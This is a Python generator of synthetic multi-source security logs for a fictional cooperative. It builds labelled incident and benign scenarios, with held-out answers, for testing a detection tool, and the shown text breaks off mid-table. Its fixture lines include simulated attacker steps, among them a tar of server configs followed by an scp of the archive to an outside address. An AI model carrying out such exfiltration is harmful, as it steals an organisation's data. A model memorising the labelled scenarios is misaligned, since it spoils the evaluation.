"""Deterministic synthetic fixture generator.

`python -m incidentloom fixtures --out fixtures` rewrites every committed fixture byte-for-byte.
Everything describes Fernhollow Cooperative, a fictional organisation. Addresses come only from the
documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, 2001:db8::/32) and every
hostname ends in the reserved `.example` domain or is an obviously fake short name.
"""

from __future__ import annotations

import csv
import io
import json
import random
from datetime import datetime
from pathlib import Path
from typing import Any

from .ingest import MONTHS as MONTH_NUMBERS
from .ingest import RESOURCE_COLUMNS
from .util import BATCH_IDS, HOUR, MINUTE, dt_from_ms, event_id, ms_from_dt

SEED = 20261013
ORG = "Fernhollow Cooperative (fictional)"
HOST_TZ_SECONDS = 2 * 3600
HOST_SKEW_SECONDS = 420
MONTHS = tuple(MONTH_NUMBERS)

SOURCES = [
    {
        "name": "idp_signin",
        "file": "idp_signin.jsonl",
        "format": "jsonl",
        "timestamp_format": "iso8601",
        "timezone": "+00:00",
        "declared_clock_offset_seconds": 0,
    },
    {
        "name": "cloud_audit",
        "file": "cloud_audit.json",
        "format": "json",
        "timestamp_format": "iso8601",
        "timezone": "+00:00",
        "declared_clock_offset_seconds": 0,
    },
    {
        "name": "host_auth",
        "file": "host_auth.log",
        "format": "syslog",
        "timestamp_format": "rfc3164",
        "timezone": "+02:00",
        "declared_clock_offset_seconds": HOST_SKEW_SECONDS,
    },
    {
        "name": "resource_access",
        "file": "resource_access.csv",
        "format": "csv",
        "timestamp_format": "epoch_ms",
        "timezone": "+00:00",
        "declared_clock_offset_seconds": 0,
    },
]

USERS = {
    "mira.quellon": "192.0.2.21",
    "tobin.harrowgate": "192.0.2.22",
    "sela.vantriss": "192.0.2.23",
    "oren.blackfen": "192.0.2.24",
    "bram.oduya": "192.0.2.25",
    "rhea.solvane": "192.0.2.26",
    "kai.thornwick": "192.0.2.27",
    "nico.ashgrove": "192.0.2.28",
    "wren.halloway": "192.0.2.29",
    "tessa.vellacourt": "192.0.2.30",
    "jun.okarra": "192.0.2.31",
    "ada.vexley": "192.0.2.32",
    "piet.morrow": "192.0.2.33",
}
SERVICES = {"svc-patchbot": "192.0.2.40", "svc-backup": "192.0.2.41", "svc-ci": "192.0.2.42"}
HOSTS = ["fh-web-01", "fh-web-02", "fh-db-01", "fh-build-01", "fh-bastion-01"]
APPS = ["mail", "wiki", "console", "vpn", "hr-portal"]
MFA_APPS = {"console", "vpn", "hr-portal"}
SHARES = ["share/fh-eng-docs", "share/fh-sales-reports", "share/fh-hr-share", "bucket/fh-backups"]

GEO = {
    "note": "Synthetic IP-to-country table for documentation address ranges only. It is not a real "
    "geolocation database; distances are rough synthetic figures in kilometres.",
    "networks": [
        {"cidr": "192.0.2.0/25", "country": "CA", "label": "Fernhollow office and staff addresses"},
        {"cidr": "192.0.2.128/25", "country": "CA", "label": "Fernhollow VPN pool"},
        {"cidr": "198.51.100.0/26", "country": "US", "label": "content delivery network"},
        {"cidr": "198.51.100.64/26", "country": "DE", "label": "residential ISP"},
        {"cidr": "198.51.100.128/26", "country": "NL", "label": "hosting provider"},
        {"cidr": "198.51.100.192/26", "country": "IN", "label": "hosting provider"},
        {"cidr": "203.0.113.0/26", "country": "BR", "label": "residential ISP"},
        {"cidr": "203.0.113.64/26", "country": "JP", "label": "mobile carrier"},
        {"cidr": "203.0.113.128/26", "country": "DE", "label": "hosting provider"},
        {"cidr": "203.0.113.192/26", "country": "US", "label": "hosting provider"},
        {"cidr": "2001:db8::/33", "country": "CA", "label": "Fernhollow IPv6 office range"},
        {"cidr": "2001:db8:8000::/33", "country": "JP", "label": "mobile carrier IPv6"},
    ],
    "distances_km": {
        "CA|US": 740,
        "CA|DE": 6100,
        "CA|NL": 5650,
        "CA|IN": 11300,
        "BR|CA": 7300,
        "CA|JP": 10300,
        "DE|US": 6700,
        "NL|US": 6200,
        "IN|US": 12000,
        "BR|US": 6800,
        "JP|US": 10900,
        "DE|NL": 580,
        "DE|IN": 5800,
        "BR|DE": 9600,
        "DE|JP": 8900,
        "IN|NL": 6350,
        "BR|NL": 9200,
        "JP|NL": 9300,
        "BR|IN": 14100,
        "IN|JP": 5850,
        "BR|JP": 17400,
    },
}


def at(day: str, hms: str) -> int:
    return ms_from_dt(datetime.fromisoformat(f"{day}T{hms}+00:00"))


def day_of(ms: int) -> str:
    return dt_from_ms(ms).strftime("%Y-%m-%d")


class Generator:
    def __init__(self) -> None:
        self.rng = random.Random(SEED)
        self.n = {"idp": 0, "ca": 0, "rs": 0}
        self.recs: list[dict[str, Any]] = []
        self.scenarios: dict[str, dict[str, Any]] = {}

    # ---- primitives -------------------------------------------------------------------------
    def hex8(self) -> str:
        return f"{self.rng.getrandbits(32):08x}"

    def nid(self, kind: str) -> str:
        self.n[kind] += 1
        return f"{kind}-{self.n[kind]:06d}"

    def add(self, src: str, t: int, rec: dict[str, Any], scn: str | None, batch: str | None = None) -> dict:
        item = {"src": src, "t": t, "rec": rec, "scn": scn, "batch": batch or day_of(t)}
        self.recs.append(item)
        return item

    def idp(
        self,
        t: int,
        user: str,
        ip: str,
        kind: str,
        result: str,
        app: str,
        scn: str | None = None,
        session: str | None = None,
        mfa: str = "none",
        reason: str | None = None,
    ) -> dict:
        rec = {
            "id": self.nid("idp"),
            "delivery_id": "dlv-" + self.hex8(),
            "event_type": kind,
            "user": user,
            "ip": ip,
            "app": app,
            "result": result,
            "failure_reason": reason,
            "mfa": mfa,
            "session_id": session,
            "user_agent": "FernhollowAgent/3.2",
        }
        return self.add("idp_signin", t, rec, scn)

    def cloud(
        self,
        t: int,
        actor: str,
        op: str,
        ttype: str,
        tname: str,
        params: dict,
        ip: str,
        scn: str | None = None,
        session: str | None = None,
        credential: str = "console",
        batch: str | None = None,
    ) -> dict:
        rec = {
            "eventId": self.nid("ca"),
            "deliveryId": "dlv-" + self.hex8(),
            "actor": {
                "principal": actor,
                "type": "service" if actor.startswith("svc-") else "user",
                "sessionId": session,
                "credential": credential,
            },
            "operation": op,
            "target": {"type": ttype, "name": tname},
            "request": {"id": "req-" + self.hex8(), "parentRequestId": None, "params": params},
            "sourceIp": ip,
            "outcome": "success",
        }
        return self.add("cloud_audit", t, rec, scn, batch)

    def host(self, t: int, host: str, prog: str, pid: int, msg: str, scn: str | None = None) -> dict:
        return self.add("host_auth", t, {"host": host, "prog": prog, "pid": pid, "msg": msg}, scn)

    def res(
        self,
        t: int,
        principal: str,
        resource: str,
        op: str,
        nbytes: int,
        ip: str,
        scn: str | None = None,
        session: str = "",
        status: str = "ok",
    ) -> dict:
        rec = {
            "record_id": self.nid("rs"),
            "delivery_id": "dlv-" + self.hex8(),
            "principal": principal,
            "resource": resource,
            "operation": op,
            "bytes": nbytes,
            "src_ip": ip,
            "session_id": session,
            "request_id": "req-" + self.hex8(),
            "status": status,
        }
        return self.add("resource_access", t, rec, scn)

    def signin(self, t: int, user: str, ip: str, app: str, scn: str | None = None, mfa: str | None = None) -> str:
        session = "s-" + self.hex8()
        if mfa is None:
            mfa = "push_approved" if app in MFA_APPS else "none"
        if mfa == "push_approved":
            self.idp(t - 9_000, user, ip, "mfa_push", "approved", app, scn, session=session)
        self.idp(t, user, ip, "signin", "success", app, scn, session=session, mfa=mfa)
        return session

    def scenario(self, sid: str, split: str, kind: str, expected: str, techniques: list[str], text: str) -> str:
        self.scenarios[sid] = {
            "split": split,
            "kind": kind,
            "expected": expected,
            "techniques": techniques,
            "description": text,
        }
        return sid

    # ---- labelled scenarios -------------------------------------------------------------------
    def build_scenarios(self) -> None:
        d13, d14, d15, d16, d17, d18 = BATCH_IDS

        s = self.scenario(
            "dev-01",
            "development",
            "brute_force_success",
            "incident",
            ["credential_brute_force"],
            "Nine failed mail sign-ins for tobin.harrowgate from one foreign address, then a success "
            "and three share downloads in the same session.",
        )
        for i in range(9):
            self.idp(
                at(d13, "10:02:00") + i * 55_000,
                "tobin.harrowgate",
                "203.0.113.77",
                "signin",
                "failure",
                "mail",
                s,
                reason="bad_password",
            )
        ses = self.signin(at(d13, "10:11:05"), "tobin.harrowgate", "203.0.113.77", "mail", s, mfa="not_enrolled")
        for i, hms in enumerate(["10:14:00", "10:15:10", "10:16:30"]):
            self.res(
                at(d13, hms),
                "tobin.harrowgate",
                f"share/fh-sales-reports/2026/q3-pipeline-{i + 1}.xlsx",
                "read",
                480_000 + i * 1000,
                "203.0.113.77",
                s,
                session=ses,
            )

        s = self.scenario(
            "dev-02",
            "development",
            "password_spray",
            "incident",
            ["password_spray"],
            "One address tries eight different accounts once each within 21 minutes.",
        )
        targets = [
            "mira.quellon",
            "sela.vantriss",
            "oren.blackfen",
            "bram.oduya",
            "rhea.solvane",
            "kai.thornwick",
            "jun.okarra",
            "wren.halloway",
        ]
        for i, user in enumerate(targets):
            self.idp(
                at(d13, "14:20:00") + i * 170_000,
                user,
                "198.51.100.200",
                "signin",
                "failure",
                "mail",
                s,
                reason="bad_password",
            )

        s = self.scenario(
            "dev-07",
            "development",
            "account_takeover_chain",
            "incident",
            ["credential_brute_force", "privilege_escalation", "public_exposure", "mass_download", "logging_disabled"],
            "Brute-forced console sign-in for nico.ashgrove, a self-granted admin role, a backup bucket "
            "made public, an anonymous bulk download and a deleted storage trail.",
        )
        for i in range(8):
            self.idp(
                at(d13, "15:40:00") + i * 65_000,
                "nico.ashgrove",
                "203.0.113.100",
                "signin",
                "failure",
                "console",
                s,
                reason="bad_password",
            )
        ses = self.signin(at(d13, "15:49:10"), "nico.ashgrove", "203.0.113.100", "console", s, mfa="not_enrolled")
        self.cloud(
            at(d13, "16:02:30"),
            "nico.ashgrove",
            "iam.role.grant",
            "user",
            "nico.ashgrove",
            {"role": "iam-admin"},
            "203.0.113.100",
            s,
            session=ses,
        )
        self.cloud(
            at(d13, "16:10:45"),
            "nico.ashgrove",
            "storage.bucket.set_acl",
            "bucket",
            "fh-backups",
            {"acl": "public-read"},
            "203.0.113.100",
            s,
            session=ses,
        )
        for i in range(52):
            self.res(
                at(d13, "16:14:00") + i * 22_000,
                "anonymous",
                f"bucket/fh-backups/nightly/db-part-{i:03d}.gz",
                "read",
                10_000_000 + (i * 7919) % 9_000_000,
                "198.51.100.150",
                s,
            )
        self.cloud(
            at(d13, "16:40:20"),
            "nico.ashgrove",
            "logging.trail.delete",
            "trail",
            "fh-storage-trail",
            {},
            "203.0.113.100",
            s,
            session=ses,
        )

        s = self.scenario(
            "dev-03",
            "development",
            "scheduled_maintenance",
            "benign",
            [],
            "Ticketed patch window CHG-1042: the patch service account logs in to four hosts (three "
            "key failures on the first), upgrades packages, reboots them and updates trail retention.",
        )
        for k, host in enumerate(["fh-web-01", "fh-web-02", "fh-db-01", "fh-build-01"]):
            t0 = at(d14, "01:00:00") + k * 25 * MINUTE
            pid = 3100 + k * 10
            if k == 0:
                for j in range(3):
                    self.host(
                        t0 - (3 - j) * 20_000,
                        host,
                        "sshd",
                        3090 + j,
                        f"Failed publickey for svc-patchbot from 192.0.2.40 port {41000 + j} ssh2",
                        s,
                    )
            self.host(
                t0, host, "sshd", pid, f"Accepted publickey for svc-patchbot from 192.0.2.40 port {41010 + k} ssh2", s
            )
            self.host(
                t0 + 40_000,
                host,
                "sudo",
                pid + 1,
                f"svc-patchbot : PPID={pid} ; USER=root ; COMMAND=/usr/bin/apt-get -y upgrade",
                s,
            )
            self.cloud(
                t0 + 9 * MINUTE,
                "svc-patchbot",
                "compute.instance.reboot",
                "instance",
                host,
                {"ticket": "CHG-1042", "window": "2026-10-14T01:00Z/03:00Z"},
                "192.0.2.40",
                s,
            )
            self.host(t0 + 12 * MINUTE, host, "sshd", pid, "session closed for user svc-patchbot", s)
        self.cloud(
            at(d14, "02:40:00"),
            "svc-patchbot",
            "logging.trail.update",
            "trail",
            "fh-org-trail",
            {"ticket": "CHG-1042", "retention_days": 400},
            "192.0.2.40",
            s,
        )

        s = self.scenario(
            "dev-04",
            "development",
            "impossible_travel",
            "incident",
            ["impossible_travel"],
            "sela.vantriss signs in from the office, from a new country nine hours later, then from a "
            "third country 35 minutes after that.",
        )
        self.signin(at(d14, "08:00:00"), "sela.vantriss", USERS["sela.vantriss"], "wiki", s)
        self.signin(at(d14, "08:30:00"), "sela.vantriss", USERS["sela.vantriss"], "mail", s)
        self.signin(at(d14, "17:10:00"), "sela.vantriss", "198.51.100.70", "mail", s)
        self.signin(at(d14, "17:45:30"), "sela.vantriss", "203.0.113.80", "console", s)

        s = self.scenario(
            "ho-01",
            "held_out",
            "host_brute_force_persistence",
            "incident",
            ["credential_brute_force", "persistence_access_key"],
            "Twelve failed SSH passwords for oren.blackfen on the bastion, a success, commands run from "
            "that session, and a new cloud access key four minutes after the login.",
        )
        for i in range(12):
            self.host(
                at(d14, "13:20:00") + i * 55_000,
                "fh-bastion-01",
                "sshd",
                7000 + i,
                f"Failed password for oren.blackfen from 203.0.113.140 port {40000 + i * 7} ssh2",
                s,
            )
        self.host(
            at(d14, "13:33:10"),
            "fh-bastion-01",
            "sshd",
            7120,
            "Accepted password for oren.blackfen from 203.0.113.140 port 40101 ssh2",
            s,
        )
        self.host(
            at(d14, "13:34:02"),
            "fh-bastion-01",
            "sudo",
            7134,
            "oren.blackfen : PPID=7120 ; USER=root ; COMMAND=/usr/bin/id",
            s,
        )
        self.host(
            at(d14, "13:35:40"),
            "fh-bastion-01",
            "proc",
            7141,
            'exec user=oren.blackfen ppid=7120 exe=/usr/local/bin/cloudctl args="iam create-access-key"',
            s,
        )
        self.cloud(
            at(d14, "13:37:00"),
            "oren.blackfen",
            "iam.accesskey.create",
            "user",
            "oren.blackfen",
            {"key_id": "fhk-3b9e1a44"},
            "192.0.2.20",
            s,
            credential="cli:fh-bastion-01",
        )
        self.host(
            at(d14, "13:41:15"),
            "fh-bastion-01",
            "proc",
            7166,
            'exec user=oren.blackfen ppid=7120 exe=/usr/bin/tar args="czf /tmp/.c.tgz /srv/configs"',
            s,
        )
        self.host(
            at(d14, "13:43:50"),
            "fh-bastion-01",
            "proc",
            7170,
            'exec user=oren.blackfen ppid=7120 exe=/usr/bin/scp args="/tmp/.c.tgz 203.0.113.140:/drop/"',
            s,
        )

        s = self.scenario(
            "dev-05",
            "development",
            "plausible_travel",
            "benign",
            [],
            "kai.thornwick signs in from the office in the morning and from a new country ten hours "
            "later, a speed an airliner can cover.",
        )
        self.signin(at(d15, "06:00:00"), "kai.thornwick", USERS["kai.thornwick"], "wiki", s)
        self.signin(at(d15, "06:20:00"), "kai.thornwick", USERS["kai.thornwick"], "mail", s)
        ses = self.signin(at(d15, "16:30:00"), "kai.thornwick", "198.51.100.130", "wiki", s)
        self.res(
            at(d15, "16:45:00"),
            "kai.thornwick",
            "share/fh-eng-docs/runbooks/oncall.md",
            "read",
            22_000,
            "198.51.100.130",
            s,
            session=ses,
        )

        s = self.scenario(
            "dev-06",
            "development",
            "mfa_fatigue",
            "incident",
            ["mfa_fatigue"],
            "Five rejected or ignored MFA pushes for rhea.solvane from one foreign address, then an "
            "approval, a sign-in and share reads in that session.",
        )
        for hms, result in [
            ("21:05:00", "denied"),
            ("21:07:10", "timeout"),
            ("21:09:30", "denied"),
            ("21:11:45", "denied"),
            ("21:14:00", "timeout"),
        ]:
            self.idp(at(d15, hms), "rhea.solvane", "203.0.113.90", "mfa_push", result, "mail", s)
        ses = self.signin(at(d15, "21:17:31"), "rhea.solvane", "203.0.113.90", "mail", s, mfa="push_approved")
        for i, hms in enumerate(["21:25:00", "21:26:40"]):
            self.res(
                at(d15, hms),
                "rhea.solvane",
                f"share/fh-eng-docs/design/arch-{i + 1}.pdf",
                "read",
                2_100_000 + i * 1000,
                "203.0.113.90",
                s,
                session=ses,
            )

        s = self.scenario(
            "ho-02",
            "held_out",
            "account_takeover_chain",
            "incident",
            [
                "mfa_fatigue",
                "privilege_escalation",
                "persistence_access_key",
                "public_exposure",
                "mass_download",
                "logging_disabled",
            ],
            "MFA push fatigue against mira.quellon, then in that console session a new access key, a "
            "self-granted storage-admin role and a finance bucket made public; an anonymous address "
            "downloads 48 objects; later the organisation trail is stopped with the new key.",
        )
        pushes = [
            ("19:02:10", "denied"),
            ("19:03:40", "denied"),
            ("19:05:05", "timeout"),
            ("19:06:50", "denied"),
            ("19:08:30", "timeout"),
            ("19:10:15", "denied"),
        ]
        for hms, result in pushes:
            self.idp(at(d15, hms), "mira.quellon", "198.51.100.140", "mfa_push", result, "console", s)
        ses = self.signin(at(d15, "19:13:29"), "mira.quellon", "198.51.100.140", "console", s, mfa="push_approved")
        self.cloud(
            at(d15, "19:20:05"),
            "mira.quellon",
            "iam.accesskey.create",
            "user",
            "mira.quellon",
            {"key_id": "fhk-7c21d9e0"},
            "198.51.100.140",
            s,
            session=ses,
        )
        self.cloud(
            at(d15, "19:23:40"),
            "mira.quellon",
            "iam.role.grant",
            "user",
            "mira.quellon",
            {"role": "storage-admin"},
            "198.51.100.140",
            s,
            session=ses,
        )
        self.cloud(
            at(d15, "19:31:15"),
            "mira.quellon",
            "storage.bucket.set_acl",
            "bucket",
            "fh-finance-exports",
            {"acl": "public-read"},
            "198.51.100.140",
            s,
            session=ses,
        )
        for i in range(48):
            self.res(
                at(d15, "19:35:00") + i * 21_000,
                "anonymous",
                f"bucket/fh-finance-exports/exports/ledger-{i:04d}.csv",
                "read",
                18_000_000 + (i * 104_729) % 12_000_000,
                "203.0.113.200",
                s,
            )
        # Delivered late: the record sits in the next day's batch.
        self.cloud(
            at(d15, "23:40:30"),
            "mira.quellon",
            "logging.trail.stop",
            "trail",
            "fh-org-trail",
            {},
            "198.51.100.140",
            s,
            credential="access_key:fhk-7c21d9e0",
            batch=d16,
        )

        s = self.scenario(
            "ho-03",
            "held_out",
            "password_spray",
            "incident",
            ["password_spray"],
            "A slow spray: one address tries thirteen accounts, one attempt every nine minutes.",
        )
        for i, user in enumerate(sorted(USERS)):
            self.idp(
                at(d16, "02:00:00") + i * 540_000,
                user,
                "203.0.113.30",
                "signin",
                "failure",
                "mail",
                s,
                reason="bad_password",
            )

        s = self.scenario(
            "ho-04",
            "held_out",
            "impossible_travel_exposure",
            "incident",
            ["impossible_travel", "public_exposure"],
            "bram.oduya signs in from the office and 50 minutes later from another continent; that "
            "session opens the HR share to everyone.",
        )
        self.signin(at(d16, "09:00:00"), "bram.oduya", USERS["bram.oduya"], "wiki", s)
        ses = self.signin(at(d16, "09:50:20"), "bram.oduya", "203.0.113.75", "console", s)
        self.cloud(
            at(d16, "10:05:40"),
            "bram.oduya",
            "storage.share.set_permission",
            "share",
            "fh-hr-share",
            {"principal": "everyone", "permission": "read"},
            "203.0.113.75",
            s,
            session=ses,
        )

        s = self.scenario(
            "ho-05",
            "held_out",
            "ticketed_change",
            "benign",
            [],
            "ada.vexley makes the public website asset bucket public under ticket CHG-2231; a content "
            "network then fetches 25 small images.",
        )
        ses = self.signin(at(d17, "09:00:00"), "ada.vexley", USERS["ada.vexley"], "console", s)
        self.cloud(
            at(d17, "09:30:10"),
            "ada.vexley",
            "storage.bucket.set_acl",
            "bucket",
            "fh-public-site-assets",
            {"acl": "public-read", "ticket": "CHG-2231"},
            USERS["ada.vexley"],
            s,
            session=ses,
        )
        for i in range(25):
            self.res(
                at(d17, "09:40:00") + i * 120_000,
                "anonymous",
                f"bucket/fh-public-site-assets/img/hero-{i:02d}.webp",
                "read",
                40_000 + i * 6_000,
                "198.51.100.10",
                s,
            )

        s = self.scenario(
            "ho-07",
            "held_out",
            "bulk_export_audit",
            "benign",
            [],
            "tessa.vellacourt downloads 60 finance exports from the office for the quarterly audit.",
        )
        ses = self.signin(at(d17, "13:55:00"), "tessa.vellacourt", USERS["tessa.vellacourt"], "wiki", s)
        for i in range(60):
            self.res(
                at(d17, "14:00:00") + i * 25_000,
                "tessa.vellacourt",
                f"bucket/fh-finance-exports/audit/q3-{i:03d}.csv",
                "read",
                11_000_000 + (i * 15_485) % 2_000_000,
                USERS["tessa.vellacourt"],
                s,
                session=ses,
            )

        s = self.scenario(
            "ho-06",
            "held_out",
            "admin_unusual",
            "benign",
            [],
            "ada.vexley, travelling, signs in at night from a new country and adds herself to the "
            "billing-admins group to run an invoice export; no ticket is recorded.",
        )
        ses = self.signin(at(d18, "02:10:00"), "ada.vexley", "198.51.100.80", "console", s)
        self.cloud(
            at(d18, "02:25:30"),
            "ada.vexley",
            "iam.group.add_member",
            "user",
            "ada.vexley",
            {"group": "billing-admins", "note": "on-call invoice export"},
            "198.51.100.80",
            s,
            session=ses,
        )
        self.cloud(
            at(d18, "02:40:00"),
            "ada.vexley",
            "billing.export.run",
            "report",
            "invoices-2026-10",
            {},
            "198.51.100.80",
            s,
            session=ses,
        )
        self.signin(at(d18, "03:05:00"), "ada.vexley", "198.51.100.80", "mail", s)

        s = self.scenario(
            "ho-08",
            "held_out",
            "brute_force_success",
            "incident",
            ["credential_brute_force"],
            "Seven failed VPN sign-ins for wren.halloway from an IPv6 mobile address, a success and "
            "share reads in that session.",
        )
        for i in range(7):
            self.idp(
                at(d18, "11:00:00") + i * 50_000,
                "wren.halloway",
                "2001:db8:8000::2a",
                "signin",
                "failure",
                "vpn",
                s,
                reason="bad_password",
            )
        ses = self.signin(at(d18, "11:08:00"), "wren.halloway", "2001:db8:8000::2a", "vpn", s, mfa="none")
        for i, hms in enumerate(["11:20:00", "11:21:30", "11:23:10"]):
            self.res(
                at(d18, hms),
                "wren.halloway",
                f"share/fh-eng-docs/src/release-{i + 1}.tar",
                "read",
                5_400_000 + i * 1000,
                "2001:db8:8000::2a",
                s,
                session=ses,
            )

    # ---- background ---------------------------------------------------------------------------
    def reservations(self) -> dict[str, list[tuple[int, int]]]:
        """Scenario actors get no background activity from 18 h before to 18 h after their scenario events."""
        spans: dict[tuple[str, str], list[int]] = {}
        for r in self.recs:
            if r["scn"] in ("dev-02", "ho-03"):
                continue  # spray targets are victims, not actors
            rec = r["rec"]
            who = rec.get("user") or rec.get("principal") or (rec.get("actor") or {}).get("principal")
            if who in USERS:
                spans.setdefault((who, r["scn"]), []).append(r["t"])
        out: dict[str, list[tuple[int, int]]] = {}
        for (who, _), ts in sorted(spans.items()):
            out.setdefault(who, []).append((min(ts) - 18 * HOUR, max(ts) + 18 * HOUR))
        return out

    def build_background(self) -> None:
        reserved = self.reservations()
        quiet = {
            "host_auth": [(at("2026-10-14", "13:45:00"), at("2026-10-14", "16:15:00"))],
            "resource_access": [(at("2026-10-16", "10:00:00"), at("2026-10-16", "14:10:00"))],
        }

        def free(user: str, t: int) -> bool:
            return not any(lo <= t <= hi for lo, hi in reserved.get(user, []))

        def pick(t: int, pool: list[str]) -> str | None:
            options = [u for u in pool if free(u, t)]
            return self.rng.choice(options) if options else None

        users = sorted(USERS)
        for day in BATCH_IDS:
            start, end = at(day, "00:00:00"), at(day, "00:00:00") + 24 * HOUR
            for src in ("idp_signin", "cloud_audit", "host_auth", "resource_access"):
                t = start + self.rng.randrange(2 * 60, 40 * 60) * 1000
                while t < end - 10 * MINUTE:
                    if not any(lo <= t <= hi for lo, hi in quiet.get(src, [])):
                        self.background_one(src, t, users, pick)
                    t += self.rng.randrange(5 * 60, 76 * 60) * 1000 + self.rng.randrange(0, 1000)
        d13, d14, d15, d16, d17, d18 = BATCH_IDS
        self.cloud(
            at(d13, "11:30:00"),
            "piet.morrow",
            "iam.group.add_member",
            "user",
            "jun.okarra",
            {"group": "eng", "ticket": "CHG-1001"},
            USERS["piet.morrow"],
            session="s-" + self.hex8(),
        )
        self.cloud(
            at(d16, "08:20:00"),
            "ada.vexley",
            "iam.role.grant",
            "user",
            "tessa.vellacourt",
            {"role": "readonly", "ticket": "CHG-2190"},
            USERS["ada.vexley"],
            session="s-" + self.hex8(),
        )
        self.cloud(
            at(d17, "15:00:00"),
            "piet.morrow",
            "iam.accesskey.create",
            "user",
            "svc-ci",
            {"key_id": "fhk-" + self.hex8(), "ticket": "CHG-2240"},
            USERS["piet.morrow"],
            session="s-" + self.hex8(),
        )
        # follow-up lines (session closes) must not leak into the silent windows
        self.recs = [
            r for r in self.recs if r["scn"] or not any(lo <= r["t"] <= hi for lo, hi in quiet.get(r["src"], []))
        ]

    def background_one(self, src: str, t: int, users: list[str], pick: Any) -> None:
        rng = self.rng
        if src == "idp_signin":
            user = pick(t, users)
            if user is None:
                return
            app = rng.choice(APPS)
            if rng.randrange(12) == 0:
                self.idp(t - 40_000, user, USERS[user], "signin", "failure", app, reason="bad_password")
            self.signin(t, user, USERS[user], app)
        elif src == "cloud_audit":
            actor = (
                pick(t, ["ada.vexley", "piet.morrow"])
                if rng.randrange(3) == 0
                else rng.choice(["svc-ci", "svc-backup"])
            )
            if actor is None:
                return
            ip = USERS.get(actor) or SERVICES[actor]
            session = "s-" + self.hex8() if actor in USERS else None
            cred = (
                "console" if actor in USERS else "access_key:fhk-" + ("0c1a0001" if actor == "svc-ci" else "0b4c0002")
            )
            choice = rng.randrange(4)
            if actor == "svc-ci":
                host = rng.choice(["fh-web-01", "fh-web-02"])
                self.cloud(
                    t,
                    actor,
                    "compute.instance.deploy",
                    "instance",
                    host,
                    {"build": f"b-{rng.randrange(1000, 9999)}"},
                    ip,
                    session=session,
                    credential=cred,
                )
            elif actor == "svc-backup":
                self.cloud(
                    t,
                    actor,
                    "storage.snapshot.create",
                    "bucket",
                    "fh-backups",
                    {"volume": rng.choice(HOSTS)},
                    ip,
                    session=session,
                    credential=cred,
                )
            elif choice < 2:
                self.cloud(
                    t,
                    actor,
                    "storage.bucket.update_lifecycle",
                    "bucket",
                    "fh-backups",
                    {"expire_days": rng.choice([30, 60, 90])},
                    ip,
                    session=session,
                    credential=cred,
                )
            else:
                self.cloud(
                    t,
                    actor,
                    "compute.instance.resize",
                    "instance",
                    rng.choice(HOSTS[:4]),
                    {"size": rng.choice(["m2", "m4", "m8"])},
                    ip,
                    session=session,
                    credential=cred,
                )
        elif src == "host_auth":
            host = rng.choice(HOSTS)
            kind = rng.randrange(3)
            if kind == 0:
                pid = rng.randrange(20000, 60000)
                self.host(t, host, "CRON", pid, "(root) CMD (/usr/local/bin/rotate-logs)")
            else:
                user = "piet.morrow" if kind == 1 else "svc-backup"
                ip = USERS.get(user) or SERVICES[user]
                pid = rng.randrange(20000, 60000)
                self.host(
                    t,
                    host,
                    "sshd",
                    pid,
                    f"Accepted publickey for {user} from {ip} port {rng.randrange(40000, 65000)} ssh2",
                )
                if user == "piet.morrow":
                    self.host(
                        t + 30_000,
                        host,
                        "sudo",
                        pid + 3,
                        f"piet.morrow : PPID={pid} ; USER=root ; COMMAND=/usr/bin/systemctl status nginx",
                    )
                self.host(t + rng.randrange(2, 4) * MINUTE, host, "sshd", pid, f"session closed for user {user}")
        else:
            user = pick(t, users)
            if user is None:
                return
            share = rng.choice(SHARES[:3])
            op = rng.choice(["read", "read", "read", "write", "list"])
            self.res(
                t,
                user,
                f"{share}/doc-{rng.randrange(100, 999)}.txt",
                op,
                rng.randrange(2_000, 900_000),
                USERS[user],
                session="s-" + self.hex8(),
            )
            if rng.randrange(6) == 0:
                self.res(
                    t + 50_000,
                    "svc-backup",
                    f"bucket/fh-backups/nightly/inc-{rng.randrange(1000, 9999)}.gz",
                    "write",
                    rng.randrange(1_000_000, 9_000_000),
                    SERVICES["svc-backup"],
                )


# ---- rendering ----------------------------------------------------------------------------------
def host_line(item: dict[str, Any]) -> str:
    rec = item["rec"]
    local = dt_from_ms(item["t"] + (HOST_TZ_SECONDS + HOST_SKEW_SECONDS) * 1000)
    return (
        f"{MONTHS[local.month - 1]} {local.day:>2} {local:%H:%M:%S} {rec['host']} {rec['prog']}[{rec['pid']}]: "
        f"{rec['msg']}"
    )


def iso_z(ms: int) -> str:
    dt = dt_from_ms(ms)
    return f"{dt:%Y-%m-%dT%H:%M:%S}.{ms % 1000:03d}Z"


def render_record(item: dict[str, Any]) -> str:
    """One source record as text (a JSON object for idp/cloud, a line for host, a CSV row for resource)."""
    src, rec = item["src"], item["rec"]
    if src == "idp_signin":
        return json.dumps(
            {
                "id": rec["id"],
                "delivery_id": rec["delivery_id"],
                "ts": iso_z(item["t"]),
                **{k: v for k, v in rec.items() if k not in ("id", "delivery_id")},
            },
            separators=(",", ":"),
        )
    if src == "cloud_audit":
        ordered = {
            "eventId": rec["eventId"],
            "deliveryId": rec["deliveryId"],
            "eventTime": dt_from_ms(item["t"]).strftime("%Y-%m-%dT%H:%M:%SZ"),
        }
        ordered.update({k: v for k, v in rec.items() if k not in ordered})
        return json.dumps(ordered, separators=(",", ":"))
    if src == "host_auth":
        return host_line(item)
    buf = io.StringIO()
    row = dict(rec, epoch_ms=item["t"])
    csv.writer(buf, lineterminator="\n").writerow([row[c] for c in RESOURCE_COLUMNS])
    return buf.getvalue().rstrip("\n")


def record_key(item: dict[str, Any]) -> str:
    rec = item["rec"]
    if item["src"] == "idp_signin":
        return rec["id"]
    if item["src"] == "cloud_audit":
        return rec["eventId"]
    if item["src"] == "resource_access":
        return rec["record_id"]
    return host_line(item)


def redeliver(item: dict[str, Any], gen: Generator, batch: str) -> dict[str, Any]:
    rec = json.loads(json.dumps(item["rec"]))
    if "delivery_id" in rec:
        rec["delivery_id"] = "dlv-" + gen.hex8()
    if "deliveryId" in rec:
        rec["deliveryId"] = "dlv-" + gen.hex8()
    return {**item, "rec": rec, "batch": batch}


MALFORMED: dict[tuple[str, str], list[tuple[int, str]]] = {
    ("2026-10-13", "idp_signin"): [
        (12, '{"id":"idp-990001","delivery_id":"dlv-0badf00d","ts":"2026-10-13T'),
        (
            31,
            '{"id":"idp-990002","delivery_id":"dlv-0badf00e","ts":"2026-10-13T12:00:00Z","event_type":"signin",'
            '"ip":"192.0.2.31","app":"wiki","result":"success"}',
        ),
    ],
    ("2026-10-13", "host_auth"): [
        (8, "fh-web-02 kernel partial write -- record truncated"),
